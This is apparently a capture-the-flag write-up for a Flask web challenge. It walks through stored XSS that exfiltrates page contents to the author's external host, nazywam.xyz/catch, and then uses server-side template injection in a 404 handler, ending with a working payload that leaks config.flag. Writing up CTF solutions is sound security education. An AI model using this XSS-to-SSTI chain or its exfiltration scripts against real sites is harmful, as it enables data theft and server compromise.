﻿## sbbs (web, 250p)
	tl;dr use xss to get a 404 error page and then use template injection to get the flag

we're given the source code of a sever that uses flask. the flag is hardcoded into the source but it's not used anywhere, so we either have to steal the source files or somehow extract it from the program.

the site itself allows us to write posts, which are then viewed by the admin. xss almost immediately comes to mind

a quick check: (you can grab the source code of /catch [here](https://gist.github.com/nazywam/5d164f1969491e2067f17b3c61329040))

```javascript
<script type="text/javascript">
window.open ('http://nazywam.xyz/catch?','_self',false)
</script>
```

confirms it:


[image extracted text: root@vps266773:/var/www/html/catch# cat
data/52.78.86.97/1468148835
user agent
mmozilla/5
0 (unknown; linux x86_64) applewebkit/ 538 _
(khtml ,
like gecko) phantomjs/2.1.1 safari/538.1
cookies
array
get
data:
array
user agent
oython-
equests/2.10 _
cookies
array]


it's worth noticing, that this ip matches the ip of the service, so the admin can access the server locally.

however, we're not able to get the files using that, same-origin-policy prevents us from making a request for the same domain but using a different protocol like "file://"

it turns out, that the responses to error messages are vulnerable to a [template injection](http://blog.portswigger.net/2015/08/server-side-template-injection.html)

```python
@app.errorhandler(404)
def not_found(e=none):
    message = "%s was not found on the server." % request.url
    template_string = template % message
    return render_template_string(template_string, title=title_404), 404
```

we have almost complete control over request.url and can inject a template, like `{{ variable }}`

the problem is, `http://52.78.86.97:8080/somepagethatdoesntexist` returns nginx error pages instead of flask ones.

as it later turned out, flask used his error pages only for specified addresses, including 127.0.0.1 ;)

no problem! we use our xss to get the page as localhost:

```javascript
<script>
function hack(url, callback){
    var xmlhttp = new xmlhttprequest();
    xmlhttp.onreadystatechange = function(){
        if (xmlhttp.readystate == 4){
			window.open ('http://nazywam.xyz/catch?'+xmlhttp.responsetext,'_self',false)
        }
    }
    xmlhttp.open("get", url, true);
    xmlhttp.send();
}

hack("/{{ flag }}")
 
</script>
```


unfortunately, we can't acces flag directly but only [template globals](http://junxiandoc.readthedocs.io/en/latest/docs/python_flask/flask_template.html#global-variables-within-templates) and they don't have references to app class. 

the breakthrough was finding the function `config.from_object("admin.app")`, with it, we can finally access the app and then the flag.

because `config.from_object()` only updates `config`, we have to print the flag separatly, so the final payload is:

`{{ config.from_object('admin.app') }} {{ config.flag }}`


[image extracted text: ~pzhttp://127
0.0.1:808
none flag{did
you
miss_
me
did
you_diss
me
was
not
found
on the
server
ktp>]


###congratz, to the author(s), that was a great chall! if only we got it 4 minutes earlier ;) ###
